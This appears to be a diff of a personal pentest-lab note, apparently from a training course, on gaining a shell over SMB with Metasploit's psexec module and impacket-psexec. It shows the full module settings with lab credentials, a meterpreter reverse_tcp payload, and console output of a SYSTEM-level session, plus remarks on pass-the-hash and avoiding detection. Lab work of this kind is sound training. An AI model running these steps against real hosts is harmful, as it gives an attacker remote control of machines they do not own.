@@ -1,9 +1,11 @@
 
 ## Gaining Shell Access
 
+#impacket-psexec
+#psexec 
 1. Metasploit psexec
 2. Instead of utilizing password or account, we can utilize hash instead
-3. metasploit is noisy , we can use psexec.py instead(similar to metasploit and cant be seen)
+3. metasploit is noisy , we can use psexec.py instead(similar to metasploit and cant be seen) -> `impacket-psexec`
 
 ## Lab Time
 - Start `msfexploit`
@@ -11,13 +13,14 @@
 - `use 4` - exploit/windows/smb/psexec
 - `set payload windows/x64/meterpreter/reverse_tcp`
 - `set RHOSTS 192.168.64.220`
-- `set subdomain MARVEL.local`
+- `set smbdomain MARVEL.local`
 - `set smbuser fcastle`
 - `set smbpass P@$$w0rd1`
 - Show targets if automatic not working you can choose other
+- Execute run
 
 
-
+> Use 4 
 ```
 msf6 > search psexec
 
@@ -39,6 +42,8 @@ msf6 exploit(windows/smb/psexec) >
 
 
 ======
+
+> You see here that the payload is not x64, you need to setup the payload to x64
 
 ```
 msf6 exploit(windows/smb/psexec) > options                                                                                     
@@ -81,6 +86,7 @@ View the full module info with the info, or info -d command.
 
 ```
 
+> Sometimes the automatic target not working, you can freely chaneg it to other if the automatic is not working
 ```
 msf6 exploit(windows/smb/psexec) > show targets
 
@@ -97,6 +103,7 @@ Exploit targets:
 
 ```
 
+> Here is the final setting
 ```
 msf6 exploit(windows/smb/psexec) > options
 
@@ -133,3 +140,93 @@ Exploit target:
    0   Automatic
 
 ```
+
+
+Running the exploit. You can interchange from background to session 1
+- `background` to go back to msf6 exploit (window/smb/psexec)
+- `sessions`
+- `session 1` - to go back to meterpreter
+
+```
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 192.168.64.4:4444 
+[*] 192.168.64.220:445 - Connecting to the server...
+[*] 192.168.64.220:445 - Authenticating to 192.168.64.220:445|MARVEL.local as user 'fcastle'...
+[*] 192.168.64.220:445 - Selecting PowerShell target
+[*] 192.168.64.220:445 - Executing the payload...
+[+] 192.168.64.220:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (200774 bytes) to 192.168.64.220
+[*] Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.220:49721) at 2024-07-14 20:29:38 -0700
+
+meterpreter > 
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                     Connection
+  --  ----  ----                     -----------                     ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ PUNISHER  192.168.64.4:4444 -> 192.168.64.220:49721 (192.168.64.22
+                                                                     0)
+
+msf6 exploit(windows/smb/psexec) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > options
+
+```
+
+- WE can use the administrator with password hash to login just change the options
+
+#psexec
+- Previous OPTIONS
+
+```
+msf6 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                192.168.64.220   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                                    /basics/using-metasploit.html
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBDomain             MARVEL.local     no        The Windows domain to use for authentication
+   SMBPass               P@$$w0rd1        no        The password for the specified username
+   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
+                                                    l read/write folder share
+   SMBUser               fcastle          no        The username to authenticate as
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+```
+
+- Now change it to Administrator
+
+- 
